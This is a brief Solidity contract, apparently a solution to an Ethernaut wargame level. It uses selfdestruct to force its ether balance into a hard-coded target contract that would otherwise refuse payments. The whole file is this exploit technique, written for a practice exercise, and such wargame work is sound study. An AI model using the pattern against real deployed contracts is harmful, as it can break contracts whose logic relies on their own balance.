// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract ContratoAutoDest {

  //funcion para recibir ether external, sin parametros y sin return
  //si quiereo recibir dinero en el deploy entonces hacer constructor payable
  receive() external payable {
  }

  function autoDestruir() public {
      address addr = 0x5400cE02A2bfA451A11D0E51D4fcb9c81617af22;//Contrato a enviar dinero (instancia dada por ethernaut)
      selfdestruct(payable(addr));
  }
}

